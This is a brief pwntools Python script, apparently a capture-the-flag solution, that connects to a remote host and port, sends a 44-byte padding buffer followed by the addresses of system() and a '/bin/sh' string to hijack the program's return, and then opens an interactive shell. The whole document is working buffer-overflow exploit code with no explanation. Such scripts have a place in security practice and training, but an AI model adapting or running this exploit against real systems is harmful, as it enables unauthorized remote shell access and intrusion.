from pwn import *

conn = remote("133.1.17.119", 15028)

system = 0x804854c
binsh = 0x80486ee

exp = "A" * (11 * 4)
exp += p32(system)
exp += p32(binsh)


conn.recvline()
conn.recvline()

conn.sendline(exp)
conn.interactive()
